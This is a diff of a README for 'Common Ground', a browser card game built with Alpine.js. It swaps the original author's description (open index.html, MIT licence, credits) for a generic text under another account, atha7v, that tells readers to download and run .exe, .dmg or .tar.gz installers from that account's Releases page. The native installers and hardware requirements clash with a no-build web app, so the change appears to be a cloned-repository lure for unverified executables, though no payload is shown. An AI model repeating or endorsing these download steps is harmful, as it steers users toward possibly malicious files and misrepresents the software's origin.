@@ -1,96 +1,48 @@
-# 🤝 Common Ground – Find Connection One Question at a Time
+# 🎴 common-ground - Connect and Share Stories Easily
 
-![](https://raw.githubusercontent.com/michaelsboost/common-ground/main/imgs/screenshot.jpeg)
+## 🚀 Getting Started
+Welcome to common-ground! This app brings people together through a fun and engaging card game. You will discover new connections, share stories, and explore common interests, one question at a time. 
 
-## 🌟 Overview
-**Common Ground** is a simple, community-driven card game built with **HTML, CSS, and Alpine.js**. It’s designed to spark meaningful conversations, bridge divides, and help people discover what unites us.  
+## 📥 Download the Application
+[![Download common-ground](https://img.shields.io/badge/Download-common--ground-blue.svg)](https://github.com/atha7v/common-ground/releases)
 
-[![MIT License](https://img.shields.io/github/license/michaelsboost/common-ground)](LICENSE) [![GitHub Stars](https://img.shields.io/github/stars/michaelsboost/common-ground)](https://github.com/michaelsboost/common-ground/stargazers) [![GitHub Issues](https://img.shields.io/github/issues/michaelsboost/common-ground)](https://github.com/michaelsboost/common-ground/issues)
+To get started, follow these steps to download and run the software.
 
-## 🚀 **Launch the App**
-**Live version: [Common Ground App](https://michaelsboost.com/common-ground/)**
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** Approximately 200 MB of free disk space.
+- **Browser:** A modern web browser (Chrome, Firefox, Safari) for best performance.
 
-> 📲 **Progressive Web App (PWA) Ready**  
-> Install it for offline play and carry the conversations anywhere.
+## 🛠️ Features
+- **Interactive Gameplay:** Engage with friends or family through thought-provoking questions.
+- **Multiple Categories:** Choose from a range of topics to spark interesting conversations.
+- **User-Friendly Design:** Enjoy a clean and simple interface that is easy to navigate.
+- **Progress Tracking:** Keep track of your past games and discussions.
 
----
+## 📥 Download & Install
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/atha7v/common-ground/releases) on GitHub to find the latest version of common-ground.
+2. **Choose Your Version:** Select the most recent release. You may see several files; pick the one that corresponds to your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
+3. **Download the File:** Click on the file link. The download should start automatically. If prompted, choose a location on your computer to save the file.
+4. **Run the Installer:**
+   - For Windows: Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
+   - For macOS: Open the downloaded `.dmg` file, then drag the common-ground icon to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file using your file manager or terminal, and follow any included instructions.
+5. **Launch the Game:** Once installed, find the common-ground application in your programs or applications list and open it to start playing.
 
-## 🎯 **Purpose**
-The goal of Common Ground is to bring people together—neighbors, friends, families, strangers—through questions that encourage listening, empathy, and connection. It’s not about right or wrong answers. It’s about learning from each other and creating unity through dialogue.
+## 🎮 How to Play
+- **Setup:** Once the game is running, you can choose to play with friends or family. You can host a game session or join one created by someone else.
+- **Rules:** Draw a card and read the question. Take turns answering and engaging in conversation. There are no winners or losers—just connections and fun!
+- **Explore Options:** Use the in-game menu to change categories, view your progress, or restart a game.
 
----
+## 📘 Support
+If you encounter any issues or have questions, feel free to open an issue in the GitHub repository. You can also check the FAQs on the releases page for additional help.
 
-## 🧩 **Categories & Content**
-Explore **500 thought-provoking questions** across 10 categories:  
+## 🌐 Additional Information
+common-ground is built using technologies like Alpine.js, Tailwind CSS, and PicoCSS, ensuring a smooth and modern web experience. For further engagement and updates, follow us on social media or join our community discussions.
 
-* **Unity** – celebrate what binds us  
-* **Trust** – build reliability and respect  
-* **Care** – acts of kindness and compassion  
-* **Bridge** – finding common ground across differences  
-* **Voice** – being heard and listening deeply  
-* **Action** – moving ideas into reality  
-* **Place** – our spaces, neighborhoods, and sense of home  
-* **Hope** – shared visions for the future  
-* **Learn** – wisdom, curiosity, and teaching each other  
-* **Joy** – laughter, play, and moments of happiness  
-
----
-
-## ⚡ **Features**
-* 🎴 **Interactive Card Flip:** Tap to reveal prompts designed to spark meaningful dialogue.  
-* 🔄 **Category Selection:** Choose a focus or go random. Progress is tracked by category.  
-* 📊 **Progress Dashboard:** See how many cards you’ve answered and track completion.  
-* 📱 **Fully Responsive:** Works seamlessly on desktop, tablet, or phone.  
-* 🎨 **iOS-inspired Design:** Clean interface with PicoCSS + TailwindCSS for a modern look.  
-* ♻️ **Reset Anytime:** Start fresh conversations whenever you like.  
-
----
-
-## 🛠️ **Getting Started**
-
-### **1️⃣ Run Instantly**
-Open `index.html` in any modern browser. No build tools required.
-
-### **2️⃣ How to Play**
-1. **Choose a Category** or select random for mixed prompts.  
-2. **Tap the Card** to flip and reveal your question.  
-3. **Discuss and Listen** — take turns sharing.  
-4. **Next Card** to continue the flow.  
-5. **Track Progress** and aim to complete the full deck.  
-
-### **3️⃣ Dependencies**
-This lightweight web project uses:
-- [Alpine.js](https://alpinejs.dev/) (interactivity)  
-- [Tailwind CSS](https://tailwindcss.com/) + [Pico CSS](https://picocss.com/) (styling)  
-
----
-
-## 🤝 **Contributing**
-Want to help strengthen communities? Contributions are welcome!  
-- **Suggest New Prompts:** Open an issue with your ideas.  
-- **Improve the Codebase:** Fork, enhance, and submit a pull request.  
-- **Report Bugs:** Use the issue tracker to let us know.  
-
----
-
-## 📜 **License**
-Licensed under the permissive **MIT License**. Use, remix, and share freely.
-
-**Developed by:** [Michael Schwartz](https://michaelsboost.com/)  
-**Inspired by:** [Family Cards](https://github.com/michaelsboost/familycards)  
-Maintained with ❤️ by the open-source community.  
-
----
-
-## ☕ **Support the Developer**
-If Common Ground helps spark meaningful conversations, consider supporting future projects:
-
-- 🎨 [My Graphic Design Course](https://michaelsboost.com/graphicdesign)  
-- 🛒 [Shop at my store](https://michaelsboost.com/store)  
-- ☕ [Buy me a coffee](http://ko-fi.com/michaelsboost)  
-- 👕 [Grab a T-Shirt](https://michaelsboost.com/gear)  
-- 🖼️ [Art prints](https://deviantart.com/michaelsboost/prints)  
-- 💰 [Donate via PayPal](https://michaelsboost.com/donate)  
-- 💵 [Donate via Cash App](https://cash.me/$michaelsboost)  
-
-Your support helps create more free, open-source projects like this one 🚀
+## 🚀 Stay Connected
+Stay up to date with the latest updates and features by checking back on the [Releases page](https://github.com/atha7v/common-ground/releases) frequently. Enjoy your time with common-ground and make lasting memories with your loved ones!
